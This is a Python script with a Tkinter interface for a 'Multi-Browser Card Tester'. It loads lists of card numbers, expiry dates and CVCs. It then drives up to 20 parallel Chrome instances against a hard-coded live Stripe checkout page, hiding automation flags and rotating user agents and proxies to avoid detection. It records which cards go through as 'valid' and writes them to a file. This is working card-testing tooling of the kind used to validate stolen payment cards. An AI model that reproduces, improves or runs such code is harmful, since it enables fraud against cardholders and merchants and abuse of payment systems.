import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import threading
import time
import os
import json
from datetime import datetime
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue

class MultiBrowserTester:
    def __init__(self, root):
        self.root = root
        self.root.title("Multi-Browser Card Tester - Parallel Testing")
        self.root.geometry("1400x1000")
        self.root.configure(bg='#0f172a')
        
        # Fixed Stripe URL
        self.target_url = "https://checkout.stripe.com/c/pay/cs_live_a16fm40sdsadFxnfqZcyTWPsjsekEfgscaG18PlcCmOrmmMEsf7lC29BLk#fidnandhYHdWcXxpYCc%2FJ2FgY2RwaXEnKSd2cXdsdWBEZmZqcGtxJz8nZGZmcVo0TX9gam5AVzFKfTBfbnwxJyknZHVsTmB8Jz8ndW5aaWxzYFp3MEtzcDUwVmFMaTY2aXRSaU9pMWw0cW01NUM2cHJkd3ZdJyknY3dqaFZgd3Ngdyc%2FcXdwYCknZ2RmbmJ3anBrYUZqaWp3Jz8nJjE3PTxjYScpJ2lkfGpwcVF8dWAnPyd2bGtiaWBabHFgaCcpJ2BrZGdpYFVpZGZgbWppYWB3dic%2FcXdwYHgl"
        
        # Variables
        self.cards_list = []
        self.results = []
        self.is_testing = False
        self.browsers = []
        self.browser_status = {}
        self.results_queue = queue.Queue()
        
        # Statistics
        self.valid_cards = []
        self.invalid_cards = []
        self.lock = threading.Lock()
        
        # Setup UI
        self.setup_ui()
        
    def setup_ui(self):
        # Main container
        main_frame = tk.Frame(self.root, bg='#0f172a')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=15)
        
        # Header
        header_frame = tk.Frame(main_frame, bg='#0f172a')
        header_frame.pack(fill=tk.X, pady=(0, 10))
        
        title_label = tk.Label(header_frame, text="🚀 MULTI-BROWSER CARD TESTER", 
                               font=('Arial', 24, 'bold'), 
                               fg='#635bff', bg='#0f172a')
        title_label.pack()
        
        subtitle_label = tk.Label(header_frame, text="Parallel Testing | Multiple Browsers | High Speed", 
                                 font=('Arial', 10), fg='#94a3b8', bg='#0f172a')
        subtitle_label.pack()
        
        # Configuration frame
        config_frame = tk.LabelFrame(main_frame, text="⚙️ Configuration", 
                                     font=('Arial', 11, 'bold'), 
                                     fg='#635bff', bg='#1e293b', 
                                     relief=tk.RIDGE, bd=2)
        config_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Row 1: Cards file
        file_row = tk.Frame(config_frame, bg='#1e293b')
        file_row.pack(fill=tk.X, padx=10, pady=8)
        
        tk.Label(file_row, text="📁 Cards File:", font=('Arial', 10), 
                fg='#e2e8f0', bg='#1e293b').pack(side=tk.LEFT, padx=(0, 10))
        
        self.file_path_var = tk.StringVar()
        file_entry = tk.Entry(file_row, textvariable=self.file_path_var, 
                             font=('Arial', 10), width=45, bg='#0f172a', 
                             fg='white', insertbackground='white')
        file_entry.pack(side=tk.LEFT, padx=(0, 10))
        
        browse_btn = tk.Button(file_row, text="Browse", command=self.browse_file,
                              bg='#635bff', fg='white', font=('Arial', 9, 'bold'),
                              cursor='hand2', relief=tk.FLAT, padx=15)
        browse_btn.pack(side=tk.LEFT)
        
        # Row 2: Options
        options_row = tk.Frame(config_frame, bg='#1e293b')
        options_row.pack(fill=tk.X, padx=10, pady=8)
        
        # Number of browsers
        tk.Label(options_row, text="🌐 Browsers:", font=('Arial', 10), 
                fg='#e2e8f0', bg='#1e293b').pack(side=tk.LEFT, padx=(0, 8))
        
        self.browser_count_var = tk.StringVar(value="5")
        browser_spin = tk.Spinbox(options_row, from_=1, to=20, textvariable=self.browser_count_var,
                                 width=4, font=('Arial', 10), bg='#0f172a', fg='white')
        browser_spin.pack(side=tk.LEFT, padx=(0, 20))
        
        # Delay
        tk.Label(options_row, text="⏱️ Delay (sec):", font=('Arial', 10), 
                fg='#e2e8f0', bg='#1e293b').pack(side=tk.LEFT, padx=(0, 8))
        
        self.delay_var = tk.StringVar(value="2")
        delay_spin = tk.Spinbox(options_row, from_=0, to=5, textvariable=self.delay_var,
                               width=4, font=('Arial', 10), bg='#0f172a', fg='white')
        delay_spin.pack(side=tk.LEFT, padx=(0, 20))
        
        # Show browser
        self.show_browser_var = tk.BooleanVar(value=True)
        show_browser_cb = tk.Checkbutton(options_row, text="Show Browser", 
                                        variable=self.show_browser_var,
                                        fg='#e2e8f0', bg='#1e293b', 
                                        selectcolor='#1e293b', font=('Arial', 9))
        show_browser_cb.pack(side=tk.LEFT, padx=(0, 20))
        
        # Use proxy
        self.use_proxy_var = tk.BooleanVar(value=False)
        proxy_cb = tk.Checkbutton(options_row, text="Use Proxy", 
                                  variable=self.use_proxy_var,
                                  fg='#e2e8f0', bg='#1e293b',
                                  selectcolor='#1e293b', font=('Arial', 9),
                                  command=self.toggle_proxy_entry)
        proxy_cb.pack(side=tk.LEFT, padx=(0, 8))
        
        self.proxy_entry = tk.Entry(options_row, font=('Arial', 9), width=25,
                                   bg='#0f172a', fg='white', insertbackground='white',
                                   state='disabled')
        self.proxy_entry.pack(side=tk.LEFT)
        self.proxy_entry.insert(0, "ip1:port1,ip2:port2")
        
        # Control buttons
        control_frame = tk.Frame(main_frame, bg='#0f172a')
        control_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.start_btn = tk.Button(control_frame, text="▶ START PARALLEL TESTING", 
                                   command=self.start_testing,
                                   bg='#10b981', fg='white', 
                                   font=('Arial', 13, 'bold'),
                                   height=1, cursor='hand2',
                                   relief=tk.FLAT)
        self.start_btn.pack(side=tk.LEFT, expand=True, fill=tk.X, padx=(0, 10))
        
        self.stop_btn = tk.Button(control_frame, text="⏹ STOP ALL", 
                                  command=self.stop_testing,
                                  bg='#ef4444', fg='white', 
                                  font=('Arial', 13, 'bold'),
                                  height=1, cursor='hand2',
                                  state='disabled', relief=tk.FLAT)
        self.stop_btn.pack(side=tk.LEFT, expand=True, fill=tk.X)
        
        # Progress bar
        self.progress = ttk.Progressbar(main_frame, mode='determinate')
        self.progress.pack(fill=tk.X, pady=(0, 5))
        
        # Status label
        self.status_label = tk.Label(main_frame, text="✅ Ready - Load cards file and start", 
                                     font=('Arial', 10), fg='#10b981', 
                                     bg='#0f172a')
        self.status_label.pack(pady=(0, 10))
        
        # BROWSER STATUS FRAME - FULL WIDTH
        browser_frame = tk.LabelFrame(main_frame, text="🖥️ BROWSER STATUS - LIVE MONITORING", 
                                      font=('Arial', 11, 'bold'),
                                      fg='#635bff', bg='#1e293b',
                                      relief=tk.RIDGE, bd=2)
        browser_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Create frame for browser status grid
        self.browser_status_frame = tk.Frame(browser_frame, bg='#1e293b')
        self.browser_status_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # We'll populate browser status dynamically when testing starts
        
        # RESULTS WINDOW - BIG SIZE 1400x600
        results_window = tk.Toplevel(self.root)
        results_window.title("📊 CARD TESTING RESULTS - LIVE DASHBOARD")
        results_window.geometry("1400x600")
        results_window.configure(bg='#0f172a')
        
        # Make it stay on top
        results_window.transient(self.root)
        
        # Results container
        results_main = tk.Frame(results_window, bg='#0f172a')
        results_main.pack(fill=tk.BOTH, expand=True, padx=15, pady=15)
        
        # Header for results window
        results_header = tk.Frame(results_main, bg='#0f172a')
        results_header.pack(fill=tk.X, pady=(0, 10))
        
        tk.Label(results_header, text="📈 LIVE TESTING RESULTS DASHBOARD", 
                font=('Arial', 18, 'bold'), fg='#635bff', bg='#0f172a').pack()
        
        tk.Label(results_header, text="Real-time updates from all browsers | Auto-refresh", 
                font=('Arial', 10), fg='#94a3b8', bg='#0f172a').pack()
        
        # Statistics bar at top
        stats_bar = tk.Frame(results_main, bg='#1e293b', relief=tk.RIDGE, bd=1)
        stats_bar.pack(fill=tk.X, pady=(0, 10))
        
        self.results_stats_label = tk.Label(stats_bar, text="📊 Valid: 0 | Invalid: 0 | Success Rate: 0% | Progress: 0/0", 
                                           font=('Arial', 11, 'bold'), fg='#635bff', bg='#1e293b')
        self.results_stats_label.pack(pady=8)
        
        # Create paned window for split view
        paned = ttk.PanedWindow(results_main, orient=tk.HORIZONTAL)
        paned.pack(fill=tk.BOTH, expand=True)
        
        # Left side - Live results
        left_frame = tk.Frame(paned, bg='#1e293b')
        paned.add(left_frame, weight=1)
        
        tk.Label(left_frame, text="📡 LIVE FEED - All Activity", font=('Arial', 11, 'bold'),
                fg='#635bff', bg='#1e293b').pack(anchor=tk.W, padx=10, pady=5)
        
        self.results_text = scrolledtext.ScrolledText(left_frame, 
                                                       font=('Consolas', 9),
                                                       bg='#0f172a', fg='#e2e8f0',
                                                       insertbackground='white',
                                                       height=25)
        self.results_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Right side - Valid/Invalid split
        right_frame = tk.Frame(paned, bg='#1e293b')
        paned.add(right_frame, weight=1)
        
        # Valid cards section
        valid_frame = tk.Frame(right_frame, bg='#1e293b')
        valid_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 5))
        
        tk.Label(valid_frame, text="✅ VALID CARDS", font=('Arial', 11, 'bold'),
                fg='#10b981', bg='#1e293b').pack(anchor=tk.W, padx=10, pady=5)
        
        self.valid_text = scrolledtext.ScrolledText(valid_frame, 
                                                     font=('Consolas', 9),
                                                     bg='#0f172a', fg='#10b981',
                                                     insertbackground='white',
                                                     height=12)
        self.valid_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Invalid cards section
        invalid_frame = tk.Frame(right_frame, bg='#1e293b')
        invalid_frame.pack(fill=tk.BOTH, expand=True)
        
        tk.Label(invalid_frame, text="❌ INVALID CARDS", font=('Arial', 11, 'bold'),
                fg='#ef4444', bg='#1e293b').pack(anchor=tk.W, padx=10, pady=5)
        
        self.invalid_text = scrolledtext.ScrolledText(invalid_frame, 
                                                       font=('Consolas', 9),
                                                       bg='#0f172a', fg='#ef4444',
                                                       insertbackground='white',
                                                       height=12)
        self.invalid_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Configure text tags
        self.results_text.tag_config('valid', foreground='#10b981')
        self.results_text.tag_config('invalid', foreground='#ef4444')
        self.results_text.tag_config('info', foreground='#635bff')
        self.results_text.tag_config('warning', foreground='#f59e0b')
        
        # Store results window reference
        self.results_window = results_window
        self.browser_labels = {}  # Store browser status labels
        
    def toggle_proxy_entry(self):
        if self.use_proxy_var.get():
            self.proxy_entry.config(state='normal')
        else:
            self.proxy_entry.config(state='disabled')
    
    def browse_file(self):
        filename = filedialog.askopenfilename(
            title="Select Cards File",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            self.file_path_var.set(filename)
            self.load_cards_from_file(filename)
    
    def load_cards_from_file(self, filename):
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                self.cards_list = []
                for line in f:
                    line = line.strip()
                    if line and '|' in line:
                        self.cards_list.append(line)
            
            self.log_message(f"✅ Loaded {len(self.cards_list)} cards from {filename}", 'info')
            self.progress['maximum'] = len(self.cards_list)
            self.status_label.config(text=f"✅ Loaded {len(self.cards_list)} cards. Ready for parallel testing!")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load file: {str(e)}")
    
    def log_message(self, message, tag='info'):
        self.results_text.insert(tk.END, f"{message}\n", tag)
        self.results_text.see(tk.END)
        self.root.update()
    
    def create_browser_status_panel(self, num_browsers):
        """Create dynamic browser status panel"""
        # Clear existing
        for widget in self.browser_status_frame.winfo_children():
            widget.destroy()
        
        self.browser_labels = {}
        
        # Create grid layout for browsers
        cols = 5
        rows = (num_browsers + cols - 1) // cols
        
        for i in range(num_browsers):
            row = i // cols
            col = i % cols
            
            # Frame for each browser
            browser_frame = tk.Frame(self.browser_status_frame, bg='#0f172a', relief=tk.RIDGE, bd=1)
            browser_frame.grid(row=row, column=col, padx=5, pady=5, sticky="nsew")
            
            # Browser title
            tk.Label(browser_frame, text=f"🌐 Browser {i+1}", 
                    font=('Arial', 9, 'bold'), fg='#635bff', bg='#0f172a').pack(pady=2)
            
            # Status label
            status_label = tk.Label(browser_frame, text="⏳ Waiting...", 
                                   font=('Arial', 8), fg='#94a3b8', bg='#0f172a',
                                   wraplength=180, justify=tk.LEFT)
            status_label.pack(pady=2, padx=5)
            
            # Cards count label
            count_label = tk.Label(browser_frame, text="Cards: 0", 
                                  font=('Arial', 7), fg='#94a3b8', bg='#0f172a')
            count_label.pack(pady=1)
            
            self.browser_labels[i] = {
                'status': status_label,
                'count': count_label,
                'cards_tested': 0
            }
        
        # Configure grid weights
        for i in range(cols):
            self.browser_status_frame.columnconfigure(i, weight=1)
        for i in range(rows):
            self.browser_status_frame.rowconfigure(i, weight=1)
    
    def update_browser_status(self):
        """Update browser status panel"""
        for browser_id, status in self.browser_status.items():
            if browser_id in self.browser_labels:
                self.browser_labels[browser_id]['status'].config(text=status)
        self.root.update()
    
    def update_browser_count(self, browser_id, count):
        if browser_id in self.browser_labels:
            self.browser_labels[browser_id]['count'].config(text=f"Cards: {count}")
    
    def setup_driver(self, browser_id, proxy=None):
        options = webdriver.ChromeOptions()
        
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        
        # Random user agent
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        ]
        options.add_argument(f'user-agent={random.choice(user_agents)}')
        
        # Different data directory for each browser
        user_data_dir = f"./chrome_data/browser_{browser_id}"
        os.makedirs(user_data_dir, exist_ok=True)
        options.add_argument(f'--user-data-dir={user_data_dir}')
        
        if not self.show_browser_var.get():
            options.add_argument('--headless')
            options.add_argument('--disable-gpu')
        
        if proxy:
            options.add_argument(f'--proxy-server={proxy}')
        
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        
        try:
            from webdriver_manager.chrome import ChromeDriverManager
            from selenium.webdriver.chrome.service import Service
            service = Service(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=options)
        except:
            driver = webdriver.Chrome(options=options)
        
        return driver
    
    def test_card_browser(self, browser_id, card_data, proxy=None):
        driver = None
        try:
            # Update status
            self.browser_status[browser_id] = f"🔍 Testing: {card_data[:25]}..."
            self.update_browser_status()
            
            driver = self.setup_driver(browser_id, proxy)
            driver.get(self.target_url)
            time.sleep(3)
            
            card_number, card_expiry, card_cvc = card_data.split('|')
            
            # Handle Stripe iframe
            try:
                iframes = driver.find_elements(By.TAG_NAME, "iframe")
                for frame in iframes:
                    src = frame.get_attribute("src") or ""
                    if "stripe" in src or "checkout" in src:
                        driver.switch_to.frame(frame)
                        break
            except:
                pass
            
            # Fill card details
            wait = WebDriverWait(driver, 10)
            card_field = wait.until(EC.presence_of_element_located((By.NAME, "cardnumber")))
            card_field.clear()
            card_field.send_keys(card_number.strip())
            
            expiry_field = driver.find_element(By.NAME, "exp-date")
            expiry_field.clear()
            expiry_field.send_keys(card_expiry.strip())
            
            cvc_field = driver.find_element(By.NAME, "cvc")
            cvc_field.clear()
            cvc_field.send_keys(card_cvc.strip())
            
            driver.switch_to.default_content()
            
            # Submit
            try:
                submit = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
                submit.click()
            except:
                pass
            
            time.sleep(3)
            
            # Check result
            page_text = driver.page_source.lower()
            error_keywords = ['incorrect', 'invalid', 'error', 'erreur']
            success_keywords = ['success', 'validé', 'confirmation', 'thank']
            
            has_error = any(k in page_text for k in error_keywords)
            has_success = any(k in page_text for k in success_keywords)
            
            is_valid = has_success and not has_error
            
            # Update browser card count
            if browser_id in self.browser_labels:
                self.browser_labels[browser_id]['cards_tested'] += 1
                self.update_browser_count(browser_id, self.browser_labels[browser_id]['cards_tested'])
            
            status_text = f"{'✅ VALID' if is_valid else '❌ INVALID'}: {card_data[:30]}"
            self.browser_status[browser_id] = status_text
            self.update_browser_status()
            
            return is_valid, card_data, browser_id
            
        except Exception as e:
            self.browser_status[browser_id] = f"⚠️ Error: {str(e)[:40]}"
            self.update_browser_status()
            return False, card_data, browser_id
        finally:
            if driver:
                driver.quit()
    
    def process_results(self):
        while self.is_testing:
            try:
                result = self.results_queue.get(timeout=1)
                is_valid, card, browser_id = result
                
                with self.lock:
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    
                    if is_valid:
                        self.valid_cards.append(card)
                        self.valid_text.insert(tk.END, f"[{timestamp}] B{browser_id+1}: {card}\n")
                        self.valid_text.see(tk.END)
                        self.log_message(f"✅ [{timestamp}] Browser {browser_id+1}: {card} -> VALID", 'valid')
                    else:
                        self.invalid_cards.append(card)
                        self.invalid_text.insert(tk.END, f"[{timestamp}] B{browser_id+1}: {card}\n")
                        self.invalid_text.see(tk.END)
                        self.log_message(f"❌ [{timestamp}] Browser {browser_id+1}: {card} -> INVALID", 'invalid')
                    
                    # Update progress
                    total_processed = len(self.valid_cards) + len(self.invalid_cards)
                    self.progress['value'] = total_processed
                    
                    # Update stats
                    if total_processed > 0:
                        success_rate = (len(self.valid_cards) / total_processed) * 100
                        self.stats_label.config(
                            text=f"📊 Valid: {len(self.valid_cards)} | Invalid: {len(self.invalid_cards)} | Rate: {success_rate:.1f}% | Processed: {total_processed}/{len(self.cards_list)}"
                        )
                        self.results_stats_label.config(
                            text=f"📊 Valid: {len(self.valid_cards)} | Invalid: {len(self.invalid_cards)} | Success Rate: {success_rate:.1f}% | Progress: {total_processed}/{len(self.cards_list)}"
                        )
                        self.status_label.config(
                            text=f"Testing... Valid: {len(self.valid_cards)} | Invalid: {len(self.invalid_cards)} | Rate: {success_rate:.1f}%"
                        )
                    
                    # Save results
                    with open('results_parallel.json', 'w', encoding='utf-8') as f:
                        json.dump({
                            'valid': self.valid_cards,
                            'invalid': self.invalid_cards,
                            'total': total_processed,
                            'timestamp': datetime.now().isoformat()
                        }, f, indent=2, ensure_ascii=False)
                    
                    with open('valid_cards_parallel.txt', 'w', encoding='utf-8') as f:
                        for vc in self.valid_cards:
                            f.write(f"{vc}\n")
                    
            except queue.Empty:
                continue
    
    def run_parallel_tests(self):
        try:
            num_browsers = int(self.browser_count_var.get())
            delay = int(self.delay_var.get())
            
            # Create browser status panel
            self.create_browser_status_panel(num_browsers)
            
            # Get proxies if enabled
            proxies = []
            if self.use_proxy_var.get() and self.proxy_entry.get().strip():
                proxy_list = self.proxy_entry.get().strip().split(',')
                proxies = [p.strip() for p in proxy_list if p.strip()]
            
            # Distribute cards to browsers
            cards_per_browser = len(self.cards_list) // num_browsers
            remainder = len(self.cards_list) % num_browsers
            
            browser_tasks = []
            card_index = 0
            
            for i in range(num_browsers):
                start_idx = card_index
                end_idx = start_idx + cards_per_browser + (1 if i < remainder else 0)
                cards_for_browser = self.cards_list[start_idx:end_idx]
                card_index = end_idx
                
                proxy = proxies[i % len(proxies)] if proxies else None
                browser_tasks.append((i, cards_for_browser, proxy))
                
                # Initialize browser status
                self.browser_status[i] = f"📋 Assigned {len(cards_for_browser)} cards"
                if i in self.browser_labels:
                    self.browser_labels[i]['status'].config(text=f"📋 Assigned {len(cards_for_browser)} cards")
                    self.browser_labels[i]['cards_tested'] = 0
            
            self.update_browser_status()
            
            # Start result processor thread
            result_thread = threading.Thread(target=self.process_results)
            result_thread.daemon = True
            result_thread.start()
            
            # Submit tasks to thread pool
            with ThreadPoolExecutor(max_workers=num_browsers) as executor:
                futures = []
                
                for browser_id, cards, proxy in browser_tasks:
                    for card in cards:
                        if not self.is_testing:
                            break
                        future = executor.submit(self.test_card_browser, browser_id, card, proxy)
                        futures.append(future)
                        time.sleep(delay)
                
                # Wait for all tasks
                for future in as_completed(futures):
                    if not self.is_testing:
                        break
                    result = future.result()
                    if result:
                        self.results_queue.put(result)
            
            # Final summary
            self.log_message("\n" + "="*60, 'info')
            self.log_message("📊 FINAL SUMMARY", 'info')
            self.log_message("="*60, 'info')
            self.log_message(f"✅ Valid Cards: {len(self.valid_cards)}", 'valid')
            self.log_message(f"❌ Invalid Cards: {len(self.invalid_cards)}", 'invalid')
            self.log_message(f"📁 Total Tested: {len(self.valid_cards) + len(self.invalid_cards)}", 'info')
            if len(self.cards_list) > 0:
                success_rate = (len(self.valid_cards) / len(self.cards_list)) * 100
                self.log_message(f"📈 Success Rate: {success_rate:.1f}%", 'info')
            self.log_message("="*60, 'info')
            self.log_message("💾 Results saved to results_parallel.json & valid_cards_parallel.txt", 'info')
            
            self.status_label.config(
                text=f"✅ Completed! Valid: {len(self.valid_cards)} | Invalid: {len(self.invalid_cards)}"
            )
            
        except Exception as e:
            self.log_message(f"❌ Error: {str(e)}", 'warning')
        finally:
            self.is_testing = False
            self.start_btn.config(state='normal')
            self.stop_btn.config(state='disabled')
    
    def start_testing(self):
        if not self.cards_list:
            messagebox.showwarning("Warning", "Please load a cards file first!")
            return
        
        if int(self.browser_count_var.get()) > len(self.cards_list):
            messagebox.showwarning("Warning", f"Browsers ({self.browser_count_var.get()}) > cards ({len(self.cards_list)})!")
            return
        
        self.is_testing = True
        self.start_btn.config(state='disabled')
        self.stop_btn.config(state='normal')
        
        # Clear previous results
        self.results_text.delete(1.0, tk.END)
        self.valid_text.delete(1.0, tk.END)
        self.invalid_text.delete(1.0, tk.END)
        self.valid_cards = []
        self.invalid_cards = []
        self.browser_status = {}
        self.progress['value'] = 0
        self.progress['maximum'] = len(self.cards_list)
        
        self.log_message(f"🚀 Starting parallel testing with {self.browser_count_var.get()} browsers...", 'info')
        self.log_message(f"📋 Total cards: {len(self.cards_list)}", 'info')
        
        # Bring results window to front
        self.results_window.lift()
        self.results_window.focus()
        
        # Run in thread
        thread = threading.Thread(target=self.run_parallel_tests)
        thread.daemon = True
        thread.start()
    
    def stop_testing(self):
        self.is_testing = False
        self.log_message("\n⚠️ Testing stopped by user", 'warning')
        self.start_btn.config(state='normal')
        self.stop_btn.config(state='disabled')

def main():
    root = tk.Tk()
    app = MultiBrowserTester(root)
    
    root.update_idletasks()
    width = 1400
    height = 1000
    x = (root.winfo_screenwidth() // 2) - (width // 2)
    y = (root.winfo_screenheight() // 2) - (height // 2)
    root.geometry(f'{width}x{height}+{x}+{y}')
    
    root.mainloop()

if __name__ == "__main__":
    main()